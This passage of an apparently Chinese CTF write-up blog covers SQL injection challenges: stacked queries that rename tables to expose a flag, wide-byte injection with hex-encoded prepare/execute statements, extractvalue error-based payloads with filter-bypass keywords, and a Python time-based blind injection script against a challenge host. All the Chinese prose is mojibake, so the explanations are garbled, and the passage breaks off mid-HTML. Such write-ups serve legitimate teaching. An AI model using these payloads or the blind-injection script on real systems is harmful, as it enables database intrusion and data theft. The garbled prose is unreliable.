href="https://www.cnblogs.com/0nth3way/articles/7128189.html">SQLæ³¨å…¥-å †å æ³¨å…¥</a></p><p>ç”±é¢˜æ„ï¼Œå¾—çŸ¥è¿™åº”è¯¥æ˜¯ä¸€ä¸ªsqlæ³¨å…¥çš„é¢˜ç›®ï¼Œç‚¹è¿›å»ç•Œé¢å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Tdw4xkpqRJPmFQy.png" alt loading="lazy"></p><p>åˆšå¼€å§‹ç”¨SQLMapæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¥½åƒæ²¡å•¥ç”¨ï¼Œäºæ˜¯æŒ‰å¼€F12</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DBHQpKrU6AjybXo.png" alt loading="lazy"></p><p>å—¯ï¼Œç¡®å®ï¼Œä¸€ä¸ªå·¥å…·æœ‰å•¥çµé­‚O.O</p><p>æµ‹è¯•å•å¼•å·</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/5WiljO9kLTRwdqv.png" alt loading="lazy"></p><p>æ¥ç€æµ‹è¯•æ³¨é‡Šï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/lDUIhJOMKngXdsa.png" alt loading="lazy"></p><p>è¢«è¿‡æ»¤æ‰äº†</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;#</code></pre><p>#æœ‰æ•ˆ</p><p>å°è¯•æ³¨å…¥sqlæŸ¥è¯¢ç­‰è¯­å¥ï¼Œæç¤ºè¢«è¿‡æ»¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/2AlOtopcrP7UjBs.png" alt loading="lazy"></p><p>äºæ˜¯å°±ç”¨åˆ°å‰é¢æåˆ°äº†å †å æ³¨å…¥</p><p>é¦–å…ˆåˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show databases;#</code></pre><p>åˆ—å‡ºæ‰€æœ‰è¡¨ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show tables;# </code></pre><p>åˆ—å‡ºè¡¨wordsä¸­çš„æ‰€æœ‰åˆ—ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from words;#</code></pre><p>åˆ—å‡ºè¡¨1919810931114514ä¸­æ‰€æœ‰çš„åˆ—ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;show columns from &#96;1919810931114514&#96;;#</code></pre><p><strong>æ³¨æ„ï¼šå­—ç¬¦ä¸²ä¸ºè¡¨åæ“ä½œæ—¶è¦åŠ åå¼•å·ï¼ï¼ï¼</strong></p><p>ç”±å±•ç¤ºçš„ç»“æœå‘ç°è¾“å…¥æŸ¥è¯¢çš„ç»“æœæ˜¯ä¸€ä¸ªæ•°å­—å’Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ˜¯è¡¨wordsä¸­çš„idå’Œdataç»“æ„ï¼ŒæœåŠ¡å™¨æ˜¯æŠŠinjectçš„æ•°å€¼èµ‹ç»™idæ¥æŸ¥è¯¢è¡¨wordsä¸­çš„æ•°æ®</p><p>è¿™é¢˜æ²¡æœ‰ç¦ç”¨renameå’Œalter</p><p>å¯é‡‡ç”¨ä¿®æ”¹è¡¨ç»“æ„çš„æ–¹æ³•æ¥å¾—åˆ°flagï¼Œå°†wordsè¡¨åæ”¹ä¸ºwords1ï¼Œå†å°†æ•°å­—åè¡¨æ”¹ä¸ºwordsï¼Œè¿™æ ·æ•°å­—åè¡¨å°±æ˜¯é»˜è®¤æŸ¥è¯¢çš„è¡¨äº†ï¼Œä½†æ˜¯å®ƒå°‘äº†ä¸€ä¸ªidåˆ—ï¼Œå¯ä»¥å°†flagå­—æ®µæ”¹ä¸ºidï¼Œæˆ–è€…æ·»åŠ idå­—æ®µ</p><blockquote><p>renameç”¨æ¥ä¿®æ”¹è¡¨å</p><p>ç”¨æ³•renameå‘½ä»¤æ ¼å¼ï¼šrename table åŸè¡¨å to æ–°è¡¨å;</p></blockquote><blockquote><p>alterç”¨æ¥åˆ é™¤ï¼Œæ·»åŠ æˆ–ä¿®æ”¹è¡¨å­—æ®µ</p><p>å¸¸ç”¨çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼šALTER TABLE &lt;è¡¨å&gt; [ä¿®æ”¹é€‰é¡¹]</p></blockquote><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#</code></pre><p>ä¸Šæ®µæ³¨å…¥è¯­å¥çš„æ„æ€æ˜¯å°†è¡¨wordsçš„åå­—ä¿®æ”¹ä¸ºwords1ï¼ŒæŠŠåŒ…å«flagè¡¨1919810931114514çš„åå­—æ”¹æˆwordsï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡æœåŠ¡å™¨æŸ¥è¯¢è¡¨1919810931114514ä¸­çš„å†…å®¹äº†ï¼Œä½†æ˜¯flagè¡¨ä¸­å«æœ‰å°‘ä¸€ä¸ªidåˆ—ï¼Œäºæ˜¯å¯ä»¥åœ¨è¡¨ä¸­æ·»åŠ ä¸€ä¸ªåè€…å°†flagåˆ—æ”¹ä¸ºidï¼Œä¸Šé¢ç”¨åˆ°çš„æ˜¯æ”¹flagåˆ—åå­—ä¸ºidçš„æ–¹æ³•,ä¸‹é¢ç»™å‡ºæ·»åŠ idåˆ—çš„æ–¹æ³•ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; add &#96;id&#96; varchar(100);#</code></pre><p>æœ€ç»ˆå¾—åˆ°flagï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UoGTZ8HB9c7KlQ3.png" alt loading="lazy"></p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><h3 id="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”easysqli-copy"><a href="#2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”easysqli-copy" class="headerlink" title="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”easysqli_copy"></a>2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”easysqli_copy</h3><p><a href="https://www.freebuf.com/articles/web/216336.html">å‚è€ƒ1</a> ï¼Œ<a href="https://xz.aliyun.com/t/3950">å‚è€ƒ2</a></p><p>ç•Œé¢ä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=pdotest'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'******'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select balabala from table1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'balabala'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select balabala from table1 where 1=?"</span><span class="token punctuation">;</span>        <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></code></pre><p> <code>$db-&gt;query(&quot;set names gbk&quot;);</code>è¿™ä¸ªè¯­å¥æ„æˆäº†å®½å­—èŠ‚æ³¨å…¥ï¼Œå³å¯ä»¥åˆ©ç”¨<code>%d5&#39;</code>é—­åˆå•å¼•å·å½¢æˆå®½å­—èŠ‚æ³¨å…¥ï¼Œé—­åˆå•å¼•å·ååé¢çš„è¯­å¥å°±æ˜¯å¯æ§çš„äº†ï¼Œæ‰€ä»¥åé¢åªéœ€è¦æ„é€ æ³¨å…¥è¯­å¥ç»•è¿‡wafå³å¯ï¼Œè¿‡æ»¤çš„ç»å¤§å¤šæ•°å­—ç¬¦ï¼Œäºæ˜¯è¿™é‡Œä½¿ç”¨<code>prepare</code>é¢„ç¼–è¯‘æ³¨å…¥</p><p>æ ¼å¼ï¼š<code>set @a=æ‰§è¡Œçš„è¯­å¥;prepare ctftest from @a; execute ctftest;</code>ï¼Œè¯¥æ ¼å¼æ”¯æŒåå…­è¿›åˆ¶ç¼–ç å’Œasciiç¼–ç æ³¨å…¥ï¼Œäºæ˜¯å°±å¯ä»¥è¿›è¡Œç»•è¿‡</p><p>äºæ˜¯å°±å¯ä»¥ç”¨è¯¥é¢„ç¼–è¯‘æ³¨å…¥+å»¶æ—¶æ³¨å…¥+å¸ƒå°”ç›²æ³¨æ¥çˆ†å‡ºæ‰€æœ‰å†…å®¹</p><p>çˆ†åˆ—Payloadï¼š<code>select if(ascii(mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;table1&#39;),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p><p>çˆ†å­—æ®µpayloadï¼š<code>select if(ascii(mid((select group_concat(fllllll4g,&#39;&#39;) from table1),&#123;&#125;,1))= &#123;&#125;,sleep(3),1)</code></p><p>å†™å‡ºç›²æ³¨è„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8e2a5a61db69418f8ebe1c973c4bdecfa176617cfa094611.changame.ichunqiu.com/?id="</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"(This is Payload)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        payload <span class="token operator">=</span> str_to_hex<span class="token punctuation">(</span>d<span class="token punctuation">)</span>        a <span class="token operator">=</span> <span class="token string">"%df%27;set @a=0x&#123;&#125;;prepare a from @a; execute a;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>a<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>å¾—åˆ°<code>table1</code>è¡¨ä¸­çš„åˆ—ï¼š<code>balabala,eih@y,fllllll4g,bbb</code>,æœ€ç»ˆåœ¨<code>fllllll4g</code>åˆ—ä¸­å¾—åˆ°flag</p><h3 id="å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”BabySqliv2-0"><a href="#å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”BabySqliv2-0" class="headerlink" title="å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”BabySqliv2.0"></a>å®‰æ’æ¯-æ–°æ˜¥ç¥ˆç¦èµ›â€”BabySqliv2.0</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€“å¼‚æˆ–æ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œå®½å­—èŠ‚æ³¨å…¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/g86QP1C5ZsThjan.png" alt loading="lazy"></p><p>ç•Œé¢çš„ä¸Šé¢˜ä¸€æ ·ï¼Œå‘ç°åªè¦ç”¨adminè´¦å·ç™»å½•ï¼Œæ— è®ºç”¨ä»€ä¹ˆå¯†ç éƒ½èƒ½ç™»å½•è¿›å»ï¼Œç™»è¿›å»åç•Œé¢å¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200202205759631.png" alt loading="lazy"></p><p>äºæ˜¯åœ¨ç™»å½•ç•Œé¢æµ‹è¯•ï¼Œå•å¼•å·æ³¨å…¥æ— æ•ˆï¼ŒçŒœæµ‹è½¬ä¹‰äº†å•å¼•å·ï¼Œåˆ©ç”¨å®½å­—èŠ‚æ³¨å…¥ï¼Œæœä¸å…¶ç„¶ï¼Œäºæ˜¯åˆ©ç”¨æŠ¥é”™æ³¨å…¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/4cPp1rotWQnUvew.png" alt loading="lazy"></p><p>æ–‡ç« å‚è€ƒï¼š<a href="https://www.gem-love.com/websecurity/467.html">ç®€æGXY_CTF â€œBabySqli v2.0â€å®½å­—èŠ‚æ³¨å…¥</a></p><p>æŠ¥é”™æ³¨å…¥æœ‰ä¸‰ç§æ–¹æ³•ï¼šfloor()ï¼Œextractvalue()ï¼Œupdatexml()ï¼Œè¿™é‡Œé‡‡ç”¨extractvalue()æŠ¥é”™æ³¨å…¥ï¼š</p><p>æŸ¥åº“ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>seselectlect<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/KDtnXxQcPvYRGV6.png" alt loading="lazy"></p><p>æŸ¥è¡¨ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span>whewherere<span class="token punctuation">(</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/YvlyLpUX7qZESNP.png" alt loading="lazy"></p><p>ç”±æ­¤å¯çŸ¥flagåº”è¯¥åœ¨f14gä¸­</p><p>æŸ¥å­—æ®µï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>whwhereere<span class="token punctuation">(</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/hIfBtkgzYT4qNOa.png" alt loading="lazy"></p><blockquote><p>æ³¨ï¼šè¿™é‡Œåº”è¯¥æ˜¯è¿‡æ»¤äº†åˆ—çš„ç›´æ¥æŸ¥è¯¢ï¼Œç”¨char()å‡½æ•°è¿›è¡Œç»•è¿‡å³å¯</p></blockquote><p>è§£å¯†MD5å€¼åä¸ºid</p><p>idåˆ—æŸ¥è¯¢ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect group_concat<span class="token punctuation">(</span>b80bb7740288fda1f201890375a60c8f<span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/9wQR4Un3pDref1W.png" alt loading="lazy"></p><p>è¿˜çœŸå…¨æ˜¯idäº†ï¼Œçœ‹å¤§ä½¬åšå®¢åå‘ç°å±…ç„¶è¿˜å¯ä»¥ç›²çŒœflagï¼Ÿï¼Ÿï¼Ÿ</p><p>flagçš„MD5å€¼ä¸º327a6c4304ad5938eaf0efb6cc3e53dc</p><p>flagåˆ—æŸ¥è¯¢ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect concat<span class="token punctuation">(</span><span class="token number">327</span>a6c4304ad5938eaf0efb6cc3e53dc<span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xoZzpbPdajKuqD3.png" alt loading="lazy"></p><p>base64è§£å¯†åä¸ºâ€œThe first man name was kâ€ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>é…åˆlimitè¿›è¡ŒæŸ¥è¯¢ï¼Œåœ¨limit 22,1å¤„å‘ç°flag</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect concat<span class="token punctuation">(</span><span class="token number">327</span>a6c4304ad5938eaf0efb6cc3e53dc<span class="token punctuation">)</span> <span class="token keyword">from</span> f14g <span class="token keyword">limit</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/PXqxeEV3Hvp7cRw.png" alt loading="lazy"></p><p>è§£ç ååªæ˜¾ç¤ºå‰é¢çš„flagï¼Œåº”è¯¥æ˜¯å‰ç«¯ç•Œé¢é™åˆ¶äº†å­—ç¬¦ä¸²çš„æ˜¾ç¤º</p><p>äºæ˜¯ç”¨åˆ°substr()å‡½æ•°è¿›è¡Œå­—ç¬¦ä¸²çš„æˆªå–ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span>d5'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>selselectect concat<span class="token punctuation">(</span><span class="token number">327</span>a6c4304ad5938eaf0efb6cc3e53dc<span class="token punctuation">)</span> <span class="token keyword">from</span> f14g <span class="token keyword">limit</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Qo3SelyJVt6qbkM.png" alt loading="lazy"></p><p>å»æ‰ç›¸åŒçš„æ‹¼åˆèµ·æ¥base64è§£ç åå³å¯å¾—åˆ°flag</p><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><h3 id="ç½‘é¼æ¯-2018â€”Comment"><a href="#ç½‘é¼æ¯-2018â€”Comment" class="headerlink" title="ç½‘é¼æ¯ 2018â€”Comment"></a>ç½‘é¼æ¯ 2018â€”Comment</h3><p>ä¸Šæ¥å…ˆæ‰«æä¸€æ³¢ï¼Œæ‰«åˆ°äº†<code>.git</code>ï¼Œ<code>index.php</code>ï¼Œ<code>login.php</code>ï¼Œ<code>git</code>æºç æ³„éœ²ï¼Œç”¨<code>Githack</code>å·¥å…·è¿›è¡Œæ¢å¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161036570.png" alt loading="lazy"></p><p>å‘ç°caseåçš„ç›´æ¥breakäº†ï¼Œä»€ä¹ˆæ“ä½œéƒ½æ²¡æœ‰ï¼Œä¼°è®¡è¿™ä»½ä»£ç ä¸å…¨ï¼Œä½¿ç”¨<code>git</code>è¿›è¡Œæ¢å¤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161519874.png" alt="image-20200509161519874" loading="lazy"></p><p>æ‰¾åˆ°å†å²commitç‰ˆæœ¬ï¼Œè¿›è¡Œä»£ç æ¢å¤ï¼Œå¾—åˆ°æœ€ç»ˆ<code>write_do.php</code>æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 